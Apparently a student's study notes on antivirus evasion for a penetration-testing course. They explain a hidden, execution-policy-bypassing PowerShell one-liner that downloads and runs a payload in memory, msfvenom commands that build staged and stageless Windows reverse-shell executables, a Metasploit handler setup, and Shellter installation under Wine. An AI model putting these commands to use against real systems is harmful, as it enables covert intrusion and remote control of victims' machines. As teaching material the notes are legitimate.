## The PowerShell AV-bypass flags: `-NoP -NonI -W Hidden -Exec Bypass -Command`

**Full command:**
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP/payload.ps1')"
```

**Piece by piece:**
- `-NoP` (short for `-NoProfile`) → tells PowerShell not to load the user's `$PROFILE` startup script. Profiles can contain logging hooks, security monitoring scripts, or AV integrations that fire at session startup. Skipping the profile removes one layer of detection that would otherwise run before your code does.
- `-NonI` (short for `-NonInteractive`) → suppresses interactive prompts. Without this, some environments pop a "Do you want to run this?" dialog that would block execution and alert the user. Non-interactive mode just runs the command and exits silently.
- `-W Hidden` (short for `-WindowStyle Hidden`) → hides the PowerShell window entirely. Without this flag, a black terminal window flashes on screen when the payload runs -- visible to the user, immediately suspicious. Hidden keeps the process running in the background with no visible window.
- `-Exec Bypass` (short for `-ExecutionPolicy Bypass`) → overrides PowerShell's execution policy for this one session. The default policy (`Restricted` or `RemoteSigned`) blocks arbitrary scripts from running. Bypass sets the policy to "don't enforce anything" for this invocation only, it doesn't change the system-wide policy at all. Note: this is a process-level override, not a registry or system change, so it leaves no lasting trace.
- `-Command "IEX(...)"` → runs the quoted string as a PowerShell command. `IEX` is short for `Invoke-Expression`, which takes a string and executes it as PowerShell code. `(New-Object Net.WebClient).DownloadString(...)` fetches the payload script's raw text over HTTP into memory as a string. The two together fetch-and-execute entirely in memory, no file ever touches disk for AV's on-access scanner to catch.

**Why the combination matters:** each flag on its own helps a little, but together they produce a payload that: runs invisibly (Hidden), skips startup monitoring (NoProfile), bypasses policy enforcement (ExecutionPolicy Bypass), avoids prompt-based detection (NonInteractive), and never writes anything to disk (IEX + DownloadString). AV signature scanning on file drops finds nothing to scan because there's nothing on disk. Behaviour-based AV may still catch it depending on the payload content, but this combination gets past a wide class of basic AV products including Avira (as confirmed in [[15. Antivirus Evasion#15.3.2. PowerShell In-Memory Injection|15.3.2]]).

**Where this comes from:** Microsoft's PowerShell command-line reference documents all five of these flags. The combination (`-NoP -NonI -W Hidden -Exec Bypass`) is one of the most widely documented AV-bypass patterns -- covered in HackTricks' [Windows PowerShell](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/windows-local-privilege-escalation/powershell-constrained-language-mode.md) notes, PayloadsAllTheThings' reverse shell reference, and generated by RevShells directly for the "PowerShell #3 (Base64)" option.

**Where to look in the response:** nothing in an HTTP response here. Success is your `nc -nvlp` listener (or msfconsole handler) receiving a connection and dropping you into a shell. If the listener stays silent: confirm your HTTP server is serving the payload file (check access log for a `200 GET`), verify the `-Command` string is correctly quoted end-to-end (a missing closing quote or mismatched single/double quotes is the most common silent failure), and confirm the victim machine can reach your Kali IP on port 80.

## Staged vs stageless payloads: why `windows/shell/reverse_tcp` (slash) needs a handler but nc works for `windows/shell_reverse_tcp` (underscore)

**Full commands:**
```bash
# Staged -- requires msfconsole multi/handler (nc will catch the connection then immediately drop it)
msfvenom -p windows/shell/reverse_tcp LHOST=$BoxIP LPORT=$Port -f exe -o staged.exe

# Stageless -- works with plain nc
msfvenom -p windows/shell_reverse_tcp LHOST=$BoxIP LPORT=$Port -f exe -o stageless.exe
```

**Piece by piece:**
- **The naming convention:** slash (`windows/shell/reverse_tcp`) means staged. Underscore (`windows/shell_reverse_tcp`) means stageless. This is a Metasploit naming convention, not intuitive from the names themselves -- the slash separates the architecture from the payload module, stageless just collapses that structure. Shellter's payload menu calls them out more honestly: staged payloads are labelled `[stager]` directly in the menu.
- **Stageless payloads:** the full reverse shell is baked into the binary at generation time. When it runs, it connects to your listener and immediately starts speaking the shell protocol. nc can handle this directly because there's no negotiation, just raw shell I/O over TCP.
- **Staged payloads (stagers):** the binary baked into the .exe is small and does only one job -- it connects to the handler and asks "give me the rest of the payload." The handler receives this request and sends the actual second-stage payload (the full Meterpreter or shell DLL) back over the same connection. The stager injects and runs that second stage in memory. nc has no idea how to respond to that "give me the second stage" request, so it accepts the TCP connection, the stager sends its request bytes, nc has nothing to say back, and the connection drops immediately.
- **Why use a stager at all:** the first stage is tiny (a few hundred bytes), which helps bypass size-based AV heuristics and reduces the initial network footprint. The real payload only ever exists in memory on the target, never on disk. This is specifically why Shellter's `Shell_Reverse_TCP [stager]` and `Meterpreter_Reverse_TCP [stager]` are the default listed options -- in-memory delivery is the whole point of AV evasion.
- **The wrong handler variant:** if you use `set PAYLOAD windows/shell_reverse_tcp` (underscore, stageless) in multi/handler but your binary is a stager, you get "Session is not valid and will be closed" immediately after connection. The handler sends nothing (it's waiting for a stageless shell that speaks its protocol immediately), the stager gets no second stage, both sides hang up. The fix is matching the handler to the payload: `windows/shell/reverse_tcp` (slash) for staged shells, `windows/meterpreter/reverse_tcp` (slash) for staged Meterpreter.

**msfconsole multi/handler setup for a staged shell:**
```bash
use multi/handler
set PAYLOAD windows/shell/reverse_tcp     # slash = staged shell
set LHOST $LocalIP
set LPORT $Port
run
```

**Where this comes from:** Metasploit's own documentation distinguishes staged vs stageless in its payload naming convention. The "stager asks the handler for the second stage" mechanism is how Metasploit's payload loading works internally -- the stager is a Metasploit-specific protocol, not generic TCP. PayloadsAllTheThings' Metasploit cheat sheet lists both variants side by side. The `[stager]` label in Shellter's payload menu is the quickest on-target indicator.

**Where to look in the response:** if nc catches the connection and immediately prints nothing or hangs then closes, that's a stager -- switch to multi/handler. If msfconsole gives "Session is not valid and will be closed" right after a connection, the handler's PAYLOAD doesn't match the binary (usually underscore vs slash mismatch). A successful staged session shows `Command shell session N opened` in msfconsole, then a blank line for input.

## Why Shellter needs wine32 (not wine64) and what the Wine prefix reset fixes

**Full commands:**
```bash
# Install wine32 (i386 architecture support -- missing by default on current Kali)
sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32:i386

# Reset the Wine prefix to 32-bit (needed if Wine created a broken 64-bit prefix before wine32 was installed)
rm -rf ~/.wine && WINEARCH=win32 wineboot
```

**Piece by piece:**
- **Why wine32 at all:** Shellter is a Windows tool distributed as a 32-bit `.exe`. Wine is the compatibility layer that lets Linux run Windows binaries. But Kali's default Wine installation is 64-bit only (`wine64`). A 32-bit executable run through `wine64` fails immediately with `wine: could not load kernel32.dll, status c0000135` because the 64-bit Wine prefix doesn't include the 32-bit `kernel32.dll` at all.
- **`sudo dpkg --add-architecture i386`** → tells Debian's package manager that the system should also fetch and install packages compiled for the 32-bit Intel architecture (`i386`). Without this line, `apt` won't even find `wine32:i386` in its search results.
- **`sudo apt -y install wine32:i386`** → installs Wine's 32-bit components including the 32-bit `kernel32.dll`, `ntdll.dll`, and the rest of the Win32 API surface that Shellter actually calls. The `:i386` suffix is mandatory, it's what tells apt to grab the i386-architecture version rather than amd64.
- **Why the Wine prefix reset matters:** Wine stores its Windows environment (registry, system DLLs, virtual `C:\`) in `~/.wine`. If you ran Wine before `wine32:i386` was installed, Wine auto-created a 64-bit prefix. Installing `wine32:i386` afterwards doesn't fix that existing prefix -- it's already broken. `rm -rf ~/.wine` wipes the broken prefix entirely. `WINEARCH=win32 wineboot` creates a fresh one using only 32-bit components. The `WINEARCH=win32` environment variable is what forces the new prefix to be 32-bit instead of 64-bit.
- **The OLE/COM errors during wineboot:** `wineboot` prints a bunch of `0009:err:ole:...` error lines while setting up the fresh prefix. These are normal Wine startup messages, not failures -- they appear every time a fresh prefix initialises on Kali. Shellter will run fine afterwards.
- **32-bit PE requirement in Shellter itself:** even with wine32 working, Shellter only accepts 32-bit PE targets (`PE32`, not `PE32+`). Verify with `file <target.exe>` before trying to inject -- a `PE32 executable` line is good, `PE32+ executable` means 64-bit and Shellter will reject it.

**Where this comes from:** Wine's own documentation notes that 64-bit Wine won't load 32-bit-only DLLs, and Debian's `dpkg --add-architecture` command is the standard mechanism for enabling multiarch on amd64 systems. The `WINEARCH=win32` approach to forcing a 32-bit prefix is documented in WineHQ's FAQ under "How do I create a 32-bit wineprefix on a 64-bit system."

**Where to look in the response:** the failure mode is `wine: could not load kernel32.dll, status c0000135` when running `shellter`. The fix works when Shellter's banner (ASCII art + version line) appears after running `shellter` with no error. If Shellter still errors after installing wine32, the broken old prefix is the likely cause -- run the `rm -rf ~/.wine && WINEARCH=win32 wineboot` reset and retry.
